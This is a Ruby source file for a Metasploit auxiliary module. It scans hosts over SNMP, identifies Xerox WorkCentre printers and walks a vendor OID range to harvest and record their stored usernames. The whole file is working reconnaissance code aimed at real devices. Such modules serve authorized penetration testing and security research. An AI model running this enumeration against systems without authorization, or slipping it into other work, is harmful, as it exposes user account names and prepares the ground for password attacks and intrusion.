##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::SNMPClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'Xerox WorkCentre User Enumeration (SNMP)',
      'Description'    => %q{
          This module will do user enumeration based on the Xerox WorkCentre present on the network.
          SNMP is used to extract the usernames.
      },
      'Author'         =>
        [
          'pello <fropert[at]packetfault.org>'
        ],
      'License'        => MSF_LICENSE
    )
  end

  def run_host(ip)
    begin
      snmp = connect_snmp

      if snmp.get_value('sysDescr.0') =~ /Xerox/
        @users = []
        285222001.upto(285222299) { |oidusernames|
          snmp.walk("1.3.6.1.4.1.253.8.51.5.1.1.4.151.#{oidusernames}") do |row|
            row.each { |val| @users << val.value.to_s if val.value.to_s.length >= 1 }
          end
        }
        print_good("#{ip} Found Users: #{@users.uniq.sort.join(", ")} ")

        @users.each do |user|
          report_note(
          :host => rhost,
          :port => datastore['RPORT'],
          :proto => 'udp',
          :sname => 'snmp',
          :update => :unique_data,
          :type => 'xerox.workcenter.user',
          :data => user)
        end
      end

    # No need to make noise about timeouts
    rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout, ::SNMP::UnsupportedVersion
    rescue ::Interrupt
      raise $!
    rescue ::Exception => e
      print_error("#{ip} Error: #{e.class} #{e} #{e.backtrace}")
    ensure
      disconnect_snmp
    end
  end
end
